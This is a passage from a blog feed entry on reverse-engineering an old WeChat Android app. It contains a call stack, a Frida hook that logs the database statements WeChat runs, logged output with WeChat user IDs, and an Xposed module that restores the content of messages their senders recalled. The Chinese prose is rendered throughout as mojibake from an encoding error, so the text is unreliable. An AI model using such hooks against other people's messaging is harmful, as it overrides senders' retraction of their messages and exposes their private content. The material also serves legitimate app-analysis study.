class="number">0</span>&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°å¤§è‡´ä¹Ÿæ˜¯å¯¹å‚æ•°ä¸€ç±»å‹è¿›è¡Œåˆ¤æ–­ï¼Œæœ€åè¿›è¡Œè¿™é‡Œ</p><p><img src="/posts/5324751f.htm/image-20240611191147091.png" alt="image-20240611191147091"></p><p>å‘ç°æŠŠmapé‡Œçš„æ•°æ®éƒ½è¿›è¡Œäº†èµ‹å€¼æ“ä½œã€‚</p><p>å¾€ä¸‹çœ‹ å‘ç°ä¸‹å›¾</p><p><img src="/posts/5324751f.htm/image-20240611191500559.png" alt="image-20240611191500559"></p><p>è·Ÿè¿›è¿™ä¸ªaæ–¹æ³•ï¼Œä¼šå‘ç°è°ƒç”¨äº†ä¸‰æ¬¡update()æ–¹æ³•ï¼Œæœ€åè·Ÿåˆ°<code>updateWithOnConflict</code>æ–¹æ³•</p><p><img src="/posts/5324751f.htm/image-20240611192549530.png" alt="image-20240611192549530"></p><p>æ‰“å°ä¸€ä¸‹è°ƒç”¨æ ˆï¼Œå¦‚ä¸‹</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.wcdb</span><span class="selector-class">.database</span><span class="selector-class">.SQLiteDatabase</span><span class="selector-class">.updateWithOnConflict</span>(Native Method)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.wcdb</span><span class="selector-class">.database</span><span class="selector-class">.SQLiteDatabase</span><span class="selector-class">.update</span>(SourceFile:<span class="number">1726</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.storagebase</span><span class="selector-class">.f</span><span class="selector-class">.update</span>(SourceFile:<span class="number">895</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.storagebase</span><span class="selector-class">.h</span><span class="selector-class">.update</span>(SourceFile:<span class="number">601</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.storage</span><span class="selector-class">.ca</span><span class="selector-class">.a</span>(SourceFile:<span class="number">2426</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.storage</span><span class="selector-class">.ca</span><span class="selector-class">.a</span>(Native Method)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.model</span><span class="selector-class">.f</span><span class="selector-class">.a</span>(SourceFile:<span class="number">2187</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.model</span><span class="selector-class">.f</span><span class="selector-class">.a</span>(Native Method)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.model</span><span class="selector-class">.ch</span><span class="selector-class">.b</span>(SourceFile:<span class="number">258</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.model</span><span class="selector-class">.ch</span><span class="selector-class">.b</span>(Native Method)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.s</span><span class="selector-class">.b</span><span class="selector-class">.b</span>(SourceFile:<span class="number">40</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.s</span><span class="selector-class">.b</span><span class="selector-class">.b</span>(Native Method)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.messenger</span><span class="selector-class">.foundation</span><span class="selector-class">.c</span><span class="selector-class">.processAddMsg</span>(SourceFile:<span class="number">165</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.messenger</span><span class="selector-class">.foundation</span><span class="selector-class">.c</span><span class="selector-class">.processAddMsg</span>(Native Method)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.messenger</span><span class="selector-class">.foundation</span><span class="selector-class">.c</span><span class="selector-class">.a</span>(SourceFile:<span class="number">1059</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.messenger</span><span class="selector-class">.foundation</span><span class="selector-class">.c</span><span class="selector-class">.a</span>(Native Method)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.messenger</span><span class="selector-class">.foundation</span><span class="selector-class">.f</span><span class="selector-class">.a</span>(SourceFile:<span class="number">118</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.messenger</span><span class="selector-class">.foundation</span><span class="selector-class">.f</span><span class="selector-class">.a</span>(Native Method)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.zero</span><span class="selector-class">.c</span><span class="selector-class">.a</span>(SourceFile:<span class="number">57</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.zero</span><span class="selector-class">.c</span><span class="selector-class">.a</span>(Native Method)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.modelmulti</span>.q<span class="variable">$a</span>$<span class="number">1</span><span class="selector-class">.onTimerExpired</span>(SourceFile:<span class="number">830</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.sdk</span><span class="selector-class">.platformtools</span><span class="selector-class">.aw</span><span class="selector-class">.handleMessage</span>(SourceFile:<span class="number">86</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.sdk</span><span class="selector-class">.platformtools</span>.aq$<span class="number">2</span><span class="selector-class">.handleMessage</span>(SourceFile:<span class="number">362</span>)</span><br><span class="line">android<span class="selector-class">.os</span><span class="selector-class">.Handler</span><span class="selector-class">.dispatchMessage</span>(Handler<span class="selector-class">.java</span>:<span class="number">106</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.sdk</span><span class="selector-class">.platformtools</span>.aq$<span class="number">2</span><span class="selector-class">.dispatchMessage</span>(SourceFile:<span class="number">350</span>)</span><br><span class="line">android<span class="selector-class">.os</span><span class="selector-class">.Looper</span><span class="selector-class">.loop</span>(Looper<span class="selector-class">.java</span>:<span class="number">164</span>)</span><br><span class="line">android<span class="selector-class">.os</span><span class="selector-class">.HandlerThread</span><span class="selector-class">.run</span>(HandlerThread<span class="selector-class">.java</span>:<span class="number">65</span>)</span><br></pre></td></tr></table></figure><p>å…¶å®é€šè¿‡ä¸Šé¢æ‰“å°notifyDataSetChangedè§‚å¯Ÿä¹ŸçŸ¥é“è‡ªå·±å‘æ¶ˆæ¯æ’¤å›æç¤ºæ˜¯10002ï¼Œä»–äººå‘æ¶ˆæ¯æ’¤å›æ˜¯10000</p><p><code>updateWithOnConflict()</code>æ–¹æ³•å°†å‚æ•°è¿›è¡Œsqlçš„æ‹¼æ¥ï¼Œç„¶åä½¿ç”¨<code>new SQLiteStatement()</code>åˆ›å»º<code>SQLiteStatement</code>å¯¹è±¡ï¼Œå†ç”¨<code>executeUpdateDelete()</code>æ¥æ‰§è¡Œ</p><p>Frida hookä¸€ä¸‹<code>executeUpdateDelete()</code>æ–¹æ³•</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_executeUpdateDelete</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">openClassFile</span>(<span class="string">&quot;/data/local/tmp/r0gson.dex&quot;</span>).<span class="title function_">load</span>();</span><br><span class="line">        <span class="keyword">const</span> gson = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.r0ysue.gson.Gson&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.wcdb.database.SQLiteStatement&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">executeUpdateDelete</span>.<span class="title function_">overload</span>().<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    </span><br><span class="line">            <span class="comment">// console.log(&quot;====================&quot;);</span></span><br><span class="line">            <span class="comment">// console.log(&quot;====================&quot;);</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;7.1.1.1 executeUpdateDelete&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;msql:&quot;</span>, <span class="variable language_">this</span>.<span class="property">mSql</span>.<span class="property">value</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Args:&quot;</span>, <span class="variable language_">this</span>.<span class="property">mBindArgs</span>.<span class="property">value</span>)</span><br><span class="line">            <span class="comment">//console.log(&quot;mDatabase:&quot;,this.mDatabase.value);</span></span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">executeUpdateDelete</span>.<span class="title function_">overload</span>().<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ’¤å›æ¶ˆæ¯ï¼Œæ‰“å°ç»“æœä¸º</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">7</span>.<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span> executeUpdateDelete</span><br><span class="line"><span class="attribute">msql</span>: UPDATE message SET msgId=?,type=?,content=? WHERE msgId=?</span><br><span class="line"><span class="attribute">Args</span>: <span class="number">1948</span>,<span class="number">10000</span>,<span class="string">&quot;G08aT&quot;</span> æ’¤å›äº†ä¸€æ¡æ¶ˆæ¯,<span class="number">1948</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">7</span>.<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span> executeUpdateDelete</span><br><span class="line"><span class="attribute">msql</span>: UPDATE rconversation SET msgType=?,flag=?,digestUser=?,digest=?,isSend=?,hasTrunc=?,unReadCount=?,conversationTime=?,content=?,username=?,status=? WHERE username=?</span><br><span class="line"><span class="attribute">Args</span>: <span class="number">10000</span>,<span class="number">1718105683000</span>,,<span class="string">&quot;G08aT&quot;</span> æ’¤å›äº†ä¸€æ¡æ¶ˆæ¯:â€¦,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1718105683000</span>,<span class="string">&quot;G08aT&quot;</span> æ’¤å›äº†ä¸€æ¡æ¶ˆæ¯:â€¦,wxid_0wk809ov49tq22,<span class="number">3</span>,wxid_0wk809ov49tq22</span><br><span class="line"></span><br><span class="line"><span class="attribute">7</span>.<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span> executeUpdateDelete</span><br><span class="line"><span class="attribute">msql</span>: UPDATE rconversation SET UnReadInvite=?,atCount=? WHERE username= ?</span><br><span class="line"><span class="attribute">Args</span>: <span class="number">0</span>,<span class="number">0</span>,wxid_0wk809ov49tq22</span><br></pre></td></tr></table></figure><p>å…¶ä¸­çš„å‚æ•°<code>msgId</code>æ˜¯æœ¬åœ°çš„æ¶ˆæ¯idï¼Œåªæœ‰ç¬¬ä¸€æ¡æ•°æ®åº“æ“ä½œæŒ‡ä»¤æ˜¯<code>WHERE msgId=?</code>çš„ï¼Œæ‰€ä»¥è¿™ä¸€æ­¥å°±æ˜¯æ‰¾åˆ°æŒ‡å®šæ¶ˆæ¯ç„¶åæ›¿æ¢ä¸ºæ’¤å›æç¤ºæ¶ˆæ¯ã€‚</p><h3 id="xposedå®ç°æ’¤å›æç¤º">xposedå®ç°æ’¤å›æç¤º</h3><p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘fridaæ‰“å°ä¼šå‡ºç°ä¸€æ¬¡WHERE msgId=?ï¼Œè€Œæ‰‹æœºä¸­å´å®é™…å‡ºç°ä¸¤æ¬¡ã€‚</p><p>æ‰€ä»¥å“²ä½¬çš„ä»£ç æˆ‘çš„ç»“æœå®ç°çš„ä¸æ˜¯å¾ˆå¥½ï¼Œåšå¾ˆå¾ˆå¾ˆç®€å•çš„ä¿®æ”¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">package com.example.xposed;</span><br><span class="line">//xposedå…¨å±€è¿‡æ»¤</span><br><span class="line">import android.util.Log;</span><br><span class="line">import static de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line">import de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line">import de.robv.android.xposed.XC_MethodHook;</span><br><span class="line">import de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line">import de.robv.android.xposed.XposedBridge;</span><br><span class="line">import de.robv.android.xposed.XposedHelpers;</span><br><span class="line">import de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line">import de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line">public class Myhook implements IXposedHookLoadPackage &#123;</span><br><span class="line">    int cnt=1;</span><br><span class="line">    @Override</span><br><span class="line">    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable &#123;</span><br><span class="line">        if (!&quot;com.tencent.mm&quot;.equals(lpparam.packageName)) &#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        final String className = &quot;com.tencent.wcdb.database.SQLiteStatement&quot;;</span><br><span class="line">        final String methodName = &quot;executeUpdateDelete&quot;;</span><br><span class="line">        Class&lt;?&gt; SDClazz = XposedHelpers.findClass(className, lpparam.classLoader);</span><br><span class="line">        XposedBridge.hookAllMethods(SDClazz, methodName, new XC_MethodHook() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            protected void beforeHookedMethod(MethodHookParam param) throws Throwable &#123;</span><br><span class="line">                super.beforeHookedMethod(param);</span><br><span class="line">                Log.d(&quot;VxHook&quot;, &quot;executeUpdateDelete&quot;);</span><br><span class="line">                Object mDatabase = XposedHelpers.getObjectField(param.thisObject, &quot;mDatabase&quot;);</span><br><span class="line">                String mSql = (String) XposedHelpers.getObjectField(param.thisObject, &quot;mSql&quot;);</span><br><span class="line">                Log.d(&quot;zxk1ng&quot;,mSql);</span><br><span class="line">                Object[] mBindArgs = (Object[]) XposedHelpers.getObjectField(param.thisObject, &quot;mBindArgs&quot;);</span><br><span class="line">                cnt+=1;</span><br><span class="line">                if ((&quot;UPDATE message SET msgId=?,type=?,content=? WHERE msgId=?&quot;.equals(mSql)) &amp;&amp; ((String) mBindArgs[2]).contains(&quot;æ’¤å›äº†ä¸€æ¡æ¶ˆæ¯&quot;) &amp;&amp; cnt%2==0 ) &#123;</span><br><span class="line"></span><br><span class="line">                    Object sm = XposedHelpers.newInstance(lpparam.classLoader.loadClass(&quot;com.tencent.wcdb.database.SQLiteStatement&quot;),</span><br><span class="line">                            mDatabase,</span><br><span class="line">                            &quot;select content from message where msgId = ?&quot;,</span><br><span class="line">                            new Object[]&#123;mBindArgs[3]&#125;);</span><br><span class="line">                    String msg = (String) XposedHelpers.callMethod(sm, &quot;simpleQueryForString&quot;);</span><br><span class="line">                    Log.d(&quot;zxk1ng&quot;,msg);</span><br><span class="line">                    Log.d(&quot;zxk1ng&quot;,(String) mBindArgs[2]);</span><br><span class="line">                    Log.d(&quot;zxk1ng&quot;,&quot;===================&quot;);</span><br><span class="line">                    if (!msg.contains(&quot;&lt;msg&gt;&quot;) ) &#123; //ä¸åŒ…å«æ—¶ æ‰§è¡Œ</span><br><span class="line">                        mBindArgs[2] = mBindArgs[2] + &quot;:&quot; + msg;</span><br><span class="line">                        Log.d(&quot;zxk1ng&quot;,(String) mBindArgs[2]);</span><br><span class="line">                        Log.d(&quot;zxk1ng&quot;, &quot;å¯¹æ–¹æ’¤å›äº†ï¼š&quot; + msg);</span><br><span class="line"></span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        param.setResult(1);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">ğŸ¥§å¯¹æ—§ç‰ˆæœ¬å¾®ä¿¡Appçš„åŸºæœ¬åŠŸèƒ½è¿›è¡Œé€†å‘åˆ†æ</summary>
    
    
    
    <category term="Androidé€†å‘" scheme="https://zxk1ng.github.io/categories/Android%E9%80%86%E5%90%91/"/>
    
    
    <category term="Androidé€†å‘" scheme="https://zxk1ng.github.io/tags/Android%E9%80%86%E5%90%91/"/>
    
    <category term="å®æˆ˜" scheme="https://zxk1ng.github.io/tags/%E5%AE%9E%E6%88%98/"/>
    
  </entry>
  
</feed>
